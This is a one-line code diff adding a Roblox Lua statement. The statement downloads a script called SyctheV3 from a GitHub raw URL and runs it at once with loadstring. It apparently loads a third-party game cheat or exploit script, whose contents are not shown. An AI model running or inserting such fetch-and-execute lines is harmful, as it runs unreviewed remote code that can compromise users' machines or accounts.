@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LaeraLuzy/SyctheV3/main/main.lua",true))();
